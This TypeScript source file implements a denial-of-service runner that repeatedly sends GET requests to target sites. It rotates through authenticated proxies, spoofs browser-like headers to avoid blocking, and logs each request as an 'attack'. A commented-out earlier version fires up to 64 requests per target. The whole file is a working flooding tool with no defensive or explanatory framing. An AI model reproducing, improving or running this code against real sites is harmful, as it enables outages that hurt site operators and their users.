import { EventEmitter } from 'events'
import axios, { AxiosError } from 'axios-https-proxy-fix'
import { TargetData, ProxyData, SiteData, TargetDataAlternative } from './types'
import { HttpHeadersUtils } from './utils/httpHeadersUtils'

export class Runner {

  //03.03.2022  Arrays targets  by agnius igres//
  private targets: TargetDataAlternative[]

  //private sites: SiteData[]
  //private proxies: ProxyData[]
  private onlyProxy: boolean
  private readonly ATTACKS_PER_TARGET = 64
  private active = false
  public readonly eventSource: EventEmitter
  private requestTimeout: number = 10000
  private startPair: number 
  private endPair: number 

  constructor(props: { targets: TargetDataAlternative[]; onlyProxy: boolean, startID: number, endID: number }) {
    this.onlyProxy = props.onlyProxy
    this.targets = props.targets
    this.startPair = props.startID
    this.endPair = props.endID
    //03.03.2022  Arrays targets  by agnius igres//

    this.eventSource = new EventEmitter()
  }
  /*constructor(props: { sites: SiteData[]; proxies: ProxyData[]; onlyProxy: boolean }) {
    this.sites = props.sites
    this.proxies = props.proxies
    this.onlyProxy = props.onlyProxy
    //03.03.2022  Arrays targets  by agnius igres//
    for (let i = 0; i < this.sites.length; i++) {
      for (let j = 0; j < this.proxies.length; j++) {
        var newTarget = {
          site: this.sites[i],
          proxy: this.proxies[j],
          NeedAttack: true
        } as TargetDataAlternative
        this.targets.push(newTarget);
      }
    }

    this.eventSource = new EventEmitter()
  }*/




  async start() {
    this.active = true
    while (this.active) {
      try {
        await this.sendTroops_alternative()
        //await this.sendTroops()
      } catch (error) {
        this.active = false
        throw error
      }
    }
  }

  stop() {
    this.active = false
  }

  setProxyActive(newProxyValue: boolean) {
    this.onlyProxy = newProxyValue
  }

  updateConfiguration(targets: TargetDataAlternative[]) {
    this.targets = targets
    //this.sites = config.sites
    //this.proxies = config.proxies
  }

  //03.03.2022  Arrays targets  by agnius igres//
  private async SimpleCheck() {

  }

  private async sendTroops_alternative() {

    let directRequest = false
    let size = this.endPair - this.startPair;
    let i = this.startPair + Math.floor(Math.random() * size);
    if (i>=this.targets.length){
      console.debug(`WRONG VALUE ${i}..${this.targets.length}`)
    }
    if (!this.onlyProxy) {

      try {
        const response = await axios.get(this.targets[i].site.page, {
          timeout: this.requestTimeout,
          headers: HttpHeadersUtils.generateRequestHeaders()
        })
        directRequest = response.status === 200
      } catch (e) {
        console.debug("DIRECT probing err ", (e as Error).message)
        this.eventSource.emit('error', { error: e })
        directRequest = false
      }

    }
    if (this.targets[i].NeedAttack) {
      let proxy = null
      try {
        if (directRequest) {
          if (this.onlyProxy) {
            console.log("Changing to only proxy")
          }
          const r = await axios.get(this.targets[i].site.page, {
            timeout: this.requestTimeout,
            headers: HttpHeadersUtils.generateRequestHeaders(),
            validateStatus: () => true
          })
          this.eventSource.emit('attack', { url: this.targets[i].site.page, log: `${this.targets[i].site.page} | DIRECT | ${r.status}` })
        } else {
          if (proxy === null) {
            proxy = this.targets[i].proxy
          }
          let proxyObj: any = {}
          const proxyAddressSplit = proxy.ip.split(':')
          const proxyIP = proxyAddressSplit[0]
          const proxyPort = parseInt(proxyAddressSplit[1])
          proxyObj.host = proxyIP
          proxyObj.port = proxyPort

          if (proxy.auth) {
            const proxyAuthSplit = proxy.auth.split(':')
            const proxyUsername = proxyAuthSplit[0]
            const proxyPassword = proxyAuthSplit[1]
            proxyObj.auth = { username: proxyUsername, password: proxyPassword }

          }


          const r = await axios.get(this.targets[i].site.page, {
            timeout: this.requestTimeout,
            headers: HttpHeadersUtils.generateRequestHeaders(),
            validateStatus: () => true,
            proxy: proxyObj
          })

          this.eventSource.emit('attack', { url: this.targets[i].site.page, log: `${this.targets[i].site.page} | PROXY | ${r.status}` })

          if (r.status === 407) {
            console.log(proxy)
            proxy = null
          }
        }
      } catch (e) {
        proxy = null
        const code = (e as AxiosError).code || 'UNKNOWN'
        if (code === 'UNKNOWN') {
          this.targets[i].NeedAttack = false
          console.error(e)
        }

        this.eventSource.emit('attack', { type: 'atack', url: this.targets[i].site.page, log: `${this.targets[i].site.page} | ${code}` })
        if (code === 'ECONNABORTED') {
          this.targets[i].NeedAttack = false
        }
      }
    }

  }

  /*private async sendTroops() {
    const target = {
      site: this.sites[Math.floor(Math.random() * this.sites.length)],
      proxy: this.proxies
    } as TargetData

    // check if direct request can be performed
    let directRequest = false
    if (!this.onlyProxy) {
      try {
        const response = await axios.get(target.site.page, {
          timeout: this.requestTimeout,
          headers: HttpHeadersUtils.generateRequestHeaders()
        })
        directRequest = response.status === 200
      } catch (e) {
        console.debug("DIRECT probing err ", (e as Error).message)
        this.eventSource.emit('error', { error: e })
        directRequest = false
      }
    }

    let proxy = null
    for (let attackIndex = 0; (attackIndex < this.ATTACKS_PER_TARGET); attackIndex++) {
      if (!this.active) {
        break
      }
      try {
        if (directRequest) {
          if (this.onlyProxy) {
            console.log("Changing to only proxy")
            break
          }
          const r = await axios.get(target.site.page, {
            timeout: this.requestTimeout,
            headers: HttpHeadersUtils.generateRequestHeaders(),
            validateStatus: () => true
          })
          this.eventSource.emit('attack', { url: target.site.page, log: `${target.site.page} | DIRECT | ${r.status}` })
        } else {
          if (proxy === null) {
            proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)]
          }
          let proxyObj: any = {}
          const proxyAddressSplit = proxy.ip.split(':')
          const proxyIP = proxyAddressSplit[0]
          const proxyPort = parseInt(proxyAddressSplit[1])
          proxyObj.host = proxyIP
          proxyObj.port = proxyPort

          if (proxy.auth) {
            const proxyAuthSplit = proxy.auth.split(':')
            const proxyUsername = proxyAuthSplit[0]
            const proxyPassword = proxyAuthSplit[1]
            proxyObj.auth = { username: proxyUsername, password: proxyPassword }

          }


          const r = await axios.get(target.site.page, {
            timeout: this.requestTimeout,
            headers: HttpHeadersUtils.generateRequestHeaders(),
            validateStatus: () => true,
            proxy: proxyObj
          })

          this.eventSource.emit('attack', { url: target.site.page, log: `${target.site.page} | PROXY | ${r.status}` })

          if (r.status === 407) {
            console.log(proxy)
            proxy = null
          }
        }
      } catch (e) {
        proxy = null
        const code = (e as AxiosError).code || 'UNKNOWN'
        if (code === 'UNKNOWN') {
          console.error(e)
        }

        this.eventSource.emit('attack', { type: 'atack', url: target.site.page, log: `${target.site.page} | ${code}` })
        if (code === 'ECONNABORTED') {
          break
        }
      }
    }
  }*/
}
